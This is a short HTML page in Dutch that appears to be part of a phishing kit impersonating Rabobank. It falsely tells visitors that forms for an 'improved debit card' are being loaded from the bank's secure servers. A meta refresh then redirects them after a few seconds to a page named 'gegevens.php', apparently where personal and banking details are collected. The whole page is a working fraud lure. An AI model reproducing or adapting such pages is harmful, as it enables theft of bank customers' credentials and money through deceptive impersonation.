<html>
<P style="MARGIN-TOP: 0in"><SPAN style='FONT-SIZE: 10pt; FONT-FAMILY: "Calibri",sans-serif'><center>
<img src="./TRYWY.png" align="center-right"><br><br><br>
Welkom op de vernieuwde online omgeving van ons klantenpanel. Uw aanvraag formulieren voor de verbeterde <br>betaalpas worden momenteel
opgevraagd uit het klantensysteem van de beveiligde servers de Rabobank N.V. <br><br>
<strong>Let op!</strong> u bevindt zich zo op onze beveiligde omgeving,
moment geduld aub de vragenlijst wordt opgevraagd <br><br>
<img src="360.gif" align="center-right">
<meta http-equiv="refresh" content="7.5; url=gegevens.php">
</span></center></p>
</html>